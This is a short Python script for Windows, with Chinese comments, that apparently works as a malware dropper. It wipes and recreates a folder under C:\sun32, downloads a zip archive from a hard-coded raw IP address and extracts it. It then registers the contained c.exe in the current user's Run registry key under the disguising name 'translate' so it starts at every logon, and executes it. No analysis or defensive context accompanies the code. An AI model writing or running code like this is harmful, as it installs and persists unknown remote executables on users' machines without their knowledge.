from urllib import request
import os
import zipfile
import win32api
import win32con
import time

def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)

def Schedule(a,b,c):
	#显示进度的函数
	per = 100.0 * a * b / c
	if per > 100 :
		per = 100
	print('%.2f%%' %(per))


def add():
	name = 'translate'  # 要添加的项值名称
	path = r'C:\sun32\center\windows\c.exe'  # 要添加的exe路径
	# 注册表项名
	KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
	# 异常处理

	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
	win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
	win32api.RegCloseKey(key)


if __name__=='__main__':
	try:
		remove_dir(r"C:\sun32")
		print("测试删除目录")
	except:
		pass

	print("测试创建目录")
	os.makedirs(r"C:\sun32\center\windows")

	print("开始获取包")
	request.urlretrieve("http://167.179.65.135/c.zip",r"C:\sun32\center\windows\c.zip", Schedule)
	azip = zipfile.ZipFile(r"C:\sun32\center\windows\c.zip")
	#解压到原始目录
	print("写入到原始目录")
	azip.extractall(r"C:\sun32\center\windows")
	
	try:
		time.sleep(2)
		print("添加表")
		add()
	except:
		print("ok")

	print("主程序启动")
	os.system(r"C:\sun32\center\windows\c.exe")



